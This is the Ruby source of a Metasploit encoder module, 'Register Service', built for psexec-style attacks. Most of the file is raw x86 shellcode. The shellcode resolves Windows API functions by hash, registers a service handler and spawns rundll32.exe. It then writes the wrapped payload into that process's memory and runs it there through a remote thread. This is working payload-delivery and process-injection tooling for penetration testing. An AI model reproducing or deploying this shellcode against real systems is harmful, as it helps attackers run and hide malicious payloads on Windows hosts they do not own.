##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasm'

class MetasploitModule < Msf::Encoder

    Rank = ManualRanking

    def initialize
        super(
            'Name'             => 'Register Service',
            'Version'          => '$Revision: 14774 $',
            'Description'      => 'Register service if used with psexec for example',
            'Author'           => 'agix',
            'Arch'             => ARCH_X86,
            'License'          => MSF_LICENSE,
            'EncoderType'      => Msf::Encoder::Type::Raw
            )
    end

    @@cpu32 = Metasm::Ia32.new
    def assemble(src, cpu=@@cpu32)
        Metasm::Shellcode.assemble(cpu, src).encode_string
    end

    def can_preserve_registers?
        true
    end

    def modified_registers
        []
    end

    def preserves_stack?
        true
    end

    def string_to_pushes(string)
        str = string.dup
        # Align string to 4 bytes
        rem = (str.length) % 4
        if rem > 0
          str << "\x00" * (4 - rem)
          pushes = ''
        else
          pushes = "h\x00\x00\x00\x00"
        end
        # string is now 4 bytes aligned with null byte

        # push string to stack, starting at the back
        while str.length > 0
          four = 'h'+str.slice!(-4,4)
          pushes << four
        end

        pushes
    end

    def encode_block(state, block)
        nb_iter = rand(0x2fffffff)+0xfffffff

        push_registers = ''
        pop_registers  = ''
        if datastore['SaveRegisters']
            datastore['SaveRegisters'].split(" ").each { |reg|
                push_registers += assemble("push %s"%reg)
                pop_registers   = assemble("pop %s"%reg) + pop_registers
            }
        end

        name = ENV['MSF_SERVICENAME']
        name ||= Rex::Text.rand_text_alpha(8)
        pushed_service_name = string_to_pushes(name)

        precode_size = 0xc6
        svcmain_code_offset = precode_size + pushed_service_name.length

        precode_size = 0xcc
        hash_code_offset = precode_size + pushed_service_name.length

        precode_size = 0xbf
        svcctrlhandler_code_offset = precode_size + pushed_service_name.length

        code_service_stopped =
            "\xE8\x00\x00\x00\x00\x5F\xEB\x07\x58\x58\x58\x58\x31\xC0\xC3" +
            "#{pushed_service_name}\x89\xE1\x8D\x47\x03\x6A\x00" +
            "\x50\x51\x68\x0B\xAA\x44\x52\xFF\xD5\x6A\x00\x6A\x00\x6A\x00\x6A" +
            "\x00\x6A\x00\x6A\x00\x6A\x01\x6A\x10\x89\xE1\x6A\x00\x51\x50\x68" +
            "\xC6\x55\x37\x7D\xFF\xD5\x57\x68\xF0\xB5\xA2\x56\xFF\xD5"

        precode_size = 0x42
        shellcode_code_offset = code_service_stopped.length + precode_size

        # code_service could be encoded in the future
        code_service =
            "\xFC\xE8\x89\x00\x00\x00\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B" +
            "\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0" +
            "\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF0\x52\x57" +
            "\x8B\x52\x10\x8B\x42\x3C\x01\xD0\x8B\x40\x78\x85\xC0\x74\x4A\x01" +
            "\xD0\x50\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x3C\x49\x8B\x34\x8B" +
            "\x01\xD6\x31\xFF\x31\xC0\xAC\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF4" +
            "\x03\x7D\xF8\x3B\x7D\x24\x75\xE2\x58\x8B\x58\x24\x01\xD3\x66\x8B" +
            "\x0C\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24" +
            "\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x58\x5F\x5A\x8B\x12\xEB\x86\x5D" +
            "\x6A\x00\x68\x70\x69\x33\x32\x68\x61\x64\x76\x61\x54\x68\x4C\x77" +
            "\x26\x07\xFF\xD5#{pushed_service_name}\x89\xE1" +
            "\x8D\x85#{[svcmain_code_offset].pack('I<')}\x6A\x00\x50\x51\x89\xE0\x6A\x00\x50\x68" +
            "\xFA\xF7\x72\xCB\xFF\xD5\x6A\x00\x68\xF0\xB5\xA2\x56\xFF\xD5\x58" +
            "\x58\x58\x58\x31\xC0\xC3\xFC\xE8\x00\x00\x00\x00\x5D\x81\xED" +
            "#{[hash_code_offset].pack('I<') + pushed_service_name}\x89\xE1\x8D" +
            "\x85#{[svcctrlhandler_code_offset].pack('I<')}\x6A\x00\x50\x51\x68\x0B\xAA\x44\x52\xFF\xD5" +
            "\x6A\x00\x6A\x00\x6A\x00\x6A\x00\x6A\x00\x6A\x00\x6A\x04\x6A\x10" +
            "\x89\xE1\x6A\x00\x51\x50\x68\xC6\x55\x37\x7D\xFF\xD5\x31\xFF\x6A" +
            "\x04\x68\x00\x10\x00\x00\x6A\x54\x57\x68\x58\xA4\x53\xE5\xFF\xD5" +
            "\xC7\x00\x44\x00\x00\x00\x8D\x70\x44\x57\x68\x2E\x65\x78\x65\x68" +
            "\x6C\x6C\x33\x32\x68\x72\x75\x6E\x64\x89\xE1\x56\x50\x57\x57\x6A" +
            "\x44\x57\x57\x57\x51\x57\x68\x79\xCC\x3F\x86\xFF\xD5\x8B\x0E\x6A" +
            "\x40\x68\x00\x10\x00\x00\x68#{[block.length].pack('I<')}\x57\x51\x68\xAE\x87" +
            "\x92\x3F\xFF\xD5\xE8\x00\x00\x00\x00\x5A\x89\xC7\x8B\x0E\x81\xC2" +
            "#{[shellcode_code_offset].pack('I<')}\x54\x68#{[block.length].pack('I<')}" +
            "\x52\x50\x51\x68\xC5\xD8\xBD\xE7\xFF" +
            "\xD5\x31\xC0\x8B\x0E\x50\x50\x50\x57\x50\x50\x51\x68\xC6\xAC\x9A" +
            "\x79\xFF\xD5\x8B\x0E\x51\x68\xC6\x96\x87\x52\xFF\xD5\x8B\x4E\x04" +
            "\x51\x68\xC6\x96\x87\x52\xFF\xD5#{code_service_stopped}"

        return push_registers + code_service + pop_registers + block
    end
end
